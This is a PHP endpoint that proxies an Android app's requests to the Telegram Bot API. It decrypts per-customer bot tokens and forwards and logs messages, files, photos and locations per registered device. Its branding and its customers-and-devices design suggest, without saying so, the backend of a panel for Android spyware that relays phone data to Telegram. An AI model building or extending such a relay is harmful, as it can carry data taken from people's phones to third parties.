<?php
declare(strict_types=1);
require_once __DIR__ . '/../../private/config/config.php';
require_once __DIR__ . '/../../private/security/helpers.php';

require_https();

// This endpoint is the secure proxy between APK and Telegram Bot API.
// APK never sees the real bot token; it sends X-API-Key + device_id,
// server looks up the customer's telegram_bots row, decrypts token, and proxies.

// Auth: APK via api_key, or Admin via session (for testing)
$customer = null;
$bearer = get_bearer_token();
if ($bearer && preg_match('/^[a-f0-9]{64}$/i', $bearer)) {
    $customer = authenticate_apk();
} else {
    if (session_status()===PHP_SESSION_NONE){session_name(SESSION_NAME);session_start();}
    if (!empty($_SESSION['customer_id'])) $customer = admin_require_login();
}
if (!$customer) json_out(['ok'=>false,'error'=>'Unauthorized'],401);

$cid = (int)$customer['id'];
if (!check_rate_limit((string)$cid, 'telegram_proxy')) json_out(['ok'=>false,'error'=>'Rate limit'],429);

$method = $_SERVER['REQUEST_METHOD'];
if ($method !== 'POST') json_out(['ok'=>false,'error'=>'Method not allowed'],405);

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) $input = $_POST;

// Expected: action = sendMessage|sendDocument|sendPhoto|getUpdates|getFile etc., plus params
$action = sanitize_string($input['action'] ?? '', 64);
if ($action === '') json_out(['ok'=>false,'error'=>'Missing action'],400);

// Allowlist actions to prevent SSRF
$allowed = ['sendMessage','sendDocument','sendPhoto','sendAudio','sendVideo','sendLocation','sendChatAction','getUpdates','getFile','getMe'];
if (!in_array($action, $allowed, true)) json_out(['ok'=>false,'error'=>'Action not allowed'],400);

// Get customer's bot token (first active bot)
$pdo = db();
$stmt = $pdo->prepare("SELECT id, token_encrypted, token_nonce, bot_username FROM telegram_bots WHERE customer_id=? AND is_connected=1 LIMIT 1");
$stmt->execute([$cid]);
$bot = $stmt->fetch();
if (!$bot) {
    // try any bot if not marked connected
    $stmt = $pdo->prepare("SELECT id, token_encrypted, token_nonce FROM telegram_bots WHERE customer_id=? LIMIT 1");
    $stmt->execute([$cid]);
    $bot = $stmt->fetch();
    if (!$bot) json_out(['ok'=>false,'error'=>'No Telegram bot configured for this customer. Configure in admin panel.'],400);
}

try {
    $token = decrypt_token($bot['token_encrypted'], $bot['token_nonce']);
} catch (Throwable $e) {
    sec_log('telegram_decrypt_failed', $cid, ['bot_id'=>$bot['id']]);
    json_out(['ok'=>false,'error'=>'Token decryption failed'],500);
}

if (!is_valid_bot_token($token)) {
    json_out(['ok'=>false,'error'=>'Invalid bot token stored'],500);
}

// Build Telegram request
// For file uploads, handle multipart
$telegramUrl = TELEGRAM_API_BASE . $token . '/' . $action;

// Prepare params: remove action, api_key, and internal
$tgParams = $input;
unset($tgParams['action'], $tgParams['api_key'], $tgParams['customer_id']);

// Ensure chat_id is customer's chat (enforce isolation)
// If request tries to send to different chat_id, override to customer's configured chat? 
// Actually each bot has one chat_id (owner's chat). We store chat_id in telegram_bots or customers?
// For simplicity, we enforce that chat_id must be the customer's bot's chat (if provided, must match bot's known chat?)
// We'll allow any chat_id but log; the isolation is at customer level (each customer's bot is separate)
if (isset($tgParams['chat_id'])) {
    // Sanitize but allow
    $tgParams['chat_id'] = sanitize_string((string)$tgParams['chat_id'], 64);
}

// Handle file upload: if there's a file in $_FILES
$hasFile = !empty($_FILES);
try {
    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    // Security: only allow https to api.telegram.org
    if (strpos($telegramUrl, 'https://api.telegram.org/') !== 0) throw new RuntimeException('Invalid Telegram URL');

    if ($hasFile) {
        // Build multipart
        $post = $tgParams;
        foreach ($_FILES as $k => $f) {
            if ($f['error'] === UPLOAD_ERR_OK) {
                // Validate size
                if ($f['size'] > UPLOAD_MAX_BYTES) {
                    json_out(['ok'=>false,'error'=>'File too large'],400);
                }
                $post[$k] = new CURLFile($f['tmp_name'], $f['type'] ?? 'application/octet-stream', $f['name']);
            }
        }
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    } else {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($tgParams));
    }
    // Add User-Agent
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['User-Agent: BABARPHANTOM-Central/1.0']);

    $resp = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);

    if ($resp === false) {
        sec_log('telegram_curl_failed', $cid, ['action'=>$action, 'error'=>$err]);
        json_out(['ok'=>false,'error'=>'Telegram request failed'],502);
    }

    // Update last_checked
    $isOk = $httpCode >= 200 && $httpCode < 300;
    $pdo->prepare("UPDATE telegram_bots SET last_checked_at=NOW(), last_error=?, is_connected=? WHERE id=?")
        ->execute([$isOk ? null : substr($resp,0,1000), $isOk ? 1 : 0, $bot['id']]);

    // Log data if it's a send action
    if (in_array($action, ['sendMessage','sendDocument','sendPhoto','sendAudio','sendVideo','sendLocation'], true)) {
        try {
            // Find device_id from input or header
            $deviceId = $input['device_id'] ?? $_SERVER['HTTP_X_DEVICE_ID'] ?? null;
            if ($deviceId) {
                $stmt = $pdo->prepare("SELECT id FROM devices WHERE customer_id=? AND device_id=? LIMIT 1");
                $stmt->execute([$cid, $deviceId]);
                $dev = $stmt->fetch();
                if ($dev) {
                    $pdo->prepare("INSERT INTO device_data (customer_id, device_id, data_type, payload_json, is_forwarded) VALUES (?, ?, ?, ?, ?)")
                        ->execute([$cid, $dev['id'], $action, json_encode($tgParams, JSON_UNESCAPED_UNICODE), $isOk ? 1 : 0]);
                }
            }
        } catch (Throwable $e) { /* ignore */ }
    }

    // Return Telegram response transparently
    header('Content-Type: application/json; charset=utf-8');
    http_response_code($httpCode);
    echo $resp;
    exit;

} catch (Throwable $e) {
    sec_log('telegram_proxy_error', $cid, ['action'=>$action, 'error'=>$e->getMessage()]);
    json_out(['ok'=>false,'error'=>'Proxy error'],500);
}
